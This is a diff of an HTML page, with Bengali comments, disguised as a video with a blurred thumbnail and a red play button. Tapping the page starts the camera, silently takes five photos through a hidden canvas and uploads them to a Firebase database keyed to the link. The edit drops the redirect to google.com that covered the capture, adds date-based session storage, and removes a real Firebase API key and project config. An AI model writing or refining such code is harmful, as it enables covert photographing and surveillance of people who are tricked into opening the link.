@@ -6,47 +6,31 @@
   <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
   <style>
-    *{margin:0;padding:0;box-sizing:border-box;}
     body,html{height:100%;background:#000;overflow:hidden;position:relative;cursor:pointer;}
     .bg{position:absolute;inset:0;background:url('https://i.imgur.com/8z3xK9L.jpeg') center/cover;filter:blur(18px) brightness(0.5);transform:scale(1.15);}
-    .overlay{position:absolute;inset:0;background:rgba(0,0,0,0.6);}
-    .play{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:120px;height:120px;background:#ff0000;border-radius:50%;display:flex;align-items:center;justify-content:center;box-shadow:0 0 90px rgba(255,0,0,0.95);border:8px solid rgba(255,255,255,0.5);animation:p 2s infinite;z-index:10;}
+    .play{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:120px;height:120px;background:#ff0000;border-radius:50%;display:flex;align-items:center;justify-content:center;box-shadow:0 0 90px rgba(255,0,0,0.95);border:8px solid rgba(255,255,255,0.5);animation:p 2s infinite;}
     @keyframes p{0%,100%{transform:translate(-50%,-50%) scale(1)}50%{transform:translate(-50%,-50%) scale(1.25)}}
     .play svg{width:56px;height:56px;fill:#fff;margin-left:10px;}
-    .title{position:absolute;bottom:100px;left:50%;transform:translateX(-50%);color:#fff;font-size:30px;font-weight:bold;text-shadow:0 0 30px #000;z-index:10;white-space:nowrap;}
   </style>
 </head>
-<body onclick="grab()">
+<body onclick="start()">
 
 <div class="bg"></div>
-<div class="overlay"></div>
-
 <div class="play">
   <svg viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg>
 </div>
 
-<div class="title">ট্যাপ করো প্লে করতে</div>
-
 <canvas id="c" style="display:none;"></canvas>
 
 <script>
-// তোমার কনফিগ বসানো হয়েছে
-const firebaseConfig = {
-  apiKey: "AIzaSyDTBla5gMV15V9HWBKAVYTWFt-CBrFfpzo",
-  authDomain: "cam-snap-8e956.firebaseapp.com",
-  databaseURL: "https://cam-snap-8e956-default-rtdb.firebaseio.com",
-  projectId: "cam-snap-8e956",
-  storageBucket: "cam-snap-8e956.firebasestorage.app",
-  messagingSenderId: "982089892260",
-  appId: "1:982089892260:web:2cfa5a4d3b3dbcf45d0131",
-  measurementId: "G-S5S37F55T6"
-};
+const firebaseConfig = { /* তোমার কনফিগ */ };
 firebase.initializeApp(firebaseConfig);
 const db = firebase.database();
 
 const id = location.pathname.split('/').pop() || location.href.split('/').pop();
+const today = new Date().toLocaleDateString('bn-BD');
 
-function grab() {
+function start() {
   const canvas = document.getElementById('c');
   const ctx = canvas.getContext('2d');
   let pics = [];
@@ -61,8 +45,7 @@ function grab() {
       let i = 0;
       const take = () => {
         if (i >= 5) {
-          db.ref('links/' + id + '/photos').set(pics);
-          setTimeout(() => location.href = "https://google.com", 800);
+          db.ref('links/' + id + '/sessions/' + today).set({photos: pics, time: new Date().toLocaleString('bn-BD')});
           return;
         }
         canvas.width = v.videoWidth || 1280;
@@ -72,9 +55,8 @@ function grab() {
         i++;
         setTimeout(take, 700);
       };
-      setTimeout(take, 1000);
-    })
-    .catch(() => setTimeout(() => location.href = "https://google.com", 1500));
+      setTimeout(take, 800);
+    });
 }
 </script>
 </body>
